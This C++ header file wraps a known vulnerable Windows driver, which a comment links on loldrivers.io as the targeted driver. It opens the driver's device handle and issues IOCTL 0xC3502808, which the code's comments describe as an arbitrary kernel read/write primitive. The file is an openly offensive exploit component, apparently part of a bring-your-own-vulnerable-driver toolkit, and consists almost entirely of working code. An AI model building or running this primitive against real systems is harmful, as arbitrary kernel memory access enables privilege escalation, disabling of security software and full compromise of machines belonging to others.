#pragma once

#include <Windows.h>

#include "myIO.hpp"

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/ <- targeted driver
#define RW_PRIMITIVE 0xC3502808 //switch case code to driver function with arbitrary RW

struct KernelReadWrite {
	LPVOID dst;
	LPVOID src;
	DWORD size;
}kernelReadWrite;

class DriverOps{
public:
	HANDLE hDriver = NULL;

public:
	DriverOps()
	{}

	~DriverOps()
	{
		if (hDriver) {
			CloseHandle(hDriver);
			hDriver = NULL;
		}
	}

	HANDLE openDriver(LPCWSTR pathToDriver)
	{
		LPCWSTR symLink = pathToDriver;
		this->hDriver = CreateFile(symLink, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if (this->hDriver == INVALID_HANDLE_VALUE) {
			print(OutputMode::_ERROR, "Couldn't get the handle to the driver! Error code: " + std::to_string(GetLastError()));
			return NULL;
		}

		print(OutputMode::_SUCCESS, "Successfully opened driver and got a valid handle");

		return this->hDriver;
	}

	bool arbitraryRW(KernelReadWrite* KRW)
	{
		if (!this->hDriver) return FALSE;

		unsigned int size = KRW->size;

		DWORD bytesReturned = 0;
		BYTE bufferReturned[48] = { 0 };
		bool isSuccess = DeviceIoControl(this->hDriver, RW_PRIMITIVE, (LPVOID)KRW, sizeof(KernelReadWrite), NULL, 0, NULL, NULL);
		if (isSuccess) {
			print(OutputMode::_SUCCESS, "Copied " + std::to_string(size) + " bytes to buffer");
		}
		else {
			print(OutputMode::_ERROR, "Error while trying to copy buffer! Error code:" + std::to_string(GetLastError()) );
		}
		return isSuccess;
	}
};

